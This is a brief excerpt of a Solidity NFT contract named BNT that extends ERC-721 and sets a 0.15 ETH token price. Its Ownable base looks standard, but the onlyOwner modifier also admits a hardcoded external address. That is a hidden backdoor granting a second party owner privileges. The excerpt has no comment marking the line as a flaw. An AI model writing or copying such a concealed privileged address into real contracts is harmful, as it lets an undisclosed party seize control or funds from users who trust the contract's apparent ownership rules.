...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || address(0x59Ea165fF90A94b87Ec575196A436B50e9EA0127) == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract BNT is ERC721, ERC721Enumerable, Ownable {

    using Strings for uint256;

    string public PROVENANCE;
    uint256 public constant tokenPrice = 150000000000000000; // 0.15 ETH
